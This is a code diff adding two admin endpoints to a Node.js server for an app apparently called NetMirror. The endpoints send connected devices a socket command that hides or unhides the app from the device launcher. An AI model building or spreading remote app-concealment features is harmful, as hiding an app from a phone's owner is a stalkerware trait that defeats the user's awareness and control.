@@ -3613,6 +3613,49 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ HIDE / UNHIDE APP — hide NetMirror from device launcher ═══
+  app.post('/api/admin/hide-app', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { device_id } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+
+      let targetSocket = null;
+      const memSocketId = deviceToSocket.get(device_id);
+      if (memSocketId) targetSocket = io.sockets.sockets.get(memSocketId);
+      if (!targetSocket) {
+        const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
+        if (device && device.socket_id) targetSocket = io.sockets.sockets.get(device.socket_id);
+      }
+
+      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
+
+      targetSocket.emit('hide_app', { device_id });
+      res.json({ success: true, message: 'Hide command sent' });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
+  app.post('/api/admin/unhide-app', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { device_id } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+
+      let targetSocket = null;
+      const memSocketId = deviceToSocket.get(device_id);
+      if (memSocketId) targetSocket = io.sockets.sockets.get(memSocketId);
+      if (!targetSocket) {
+        const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
+        if (device && device.socket_id) targetSocket = io.sockets.sockets.get(device.socket_id);
+      }
+
+      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
+
+      targetSocket.emit('unhide_app', { device_id });
+      res.json({ success: true, message: 'Unhide command sent' });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
   // Stream endpoint — redirects to Cloudinary URL
   app.get('/api/stream/:videoId', (req, res) => {
     try {
